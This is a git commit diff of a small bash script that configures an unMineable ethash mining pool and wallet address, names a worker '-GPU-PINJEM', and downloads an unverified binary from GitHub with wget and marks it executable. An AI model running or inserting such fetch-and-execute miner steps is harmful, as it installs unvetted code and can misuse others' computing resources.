f5f2f11f92c237c596aa2e3302ee94e252c5d57c
mansoorjama <85673565+mansoorjama@users.noreply.github.com>
2021-07-13 23:38:43 +0300

    Update new.sh

--- new.sh
+++ new.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=WIN:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
+WALLET=WIN:THyaVTKqcVu3f5UfYoG21cbYF8ir1jNKPm
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 wget https://github.com/mansoorjama/main/raw/main/mansoor
 chmod +x mansoor
